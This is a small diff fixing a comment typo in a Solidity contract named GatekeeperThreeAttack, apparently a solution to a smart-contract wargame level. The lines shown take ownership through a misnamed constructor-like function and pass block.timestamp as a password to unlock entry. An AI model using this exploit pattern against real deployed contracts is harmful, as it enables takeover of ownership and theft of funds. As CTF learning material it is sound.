@@ -13,7 +13,7 @@ contract GatekeeperThreeAttack {
     function attack() public {
         // Take ownership
         gatekeeperThree.construct0r();
-        // Set pasword block.timmestamp
+        // Set password block.timestamp
         gatekeeperThree.createTrick();
         // Set allow_entrance = true
         gatekeeperThree.getAllowance(block.timestamp);
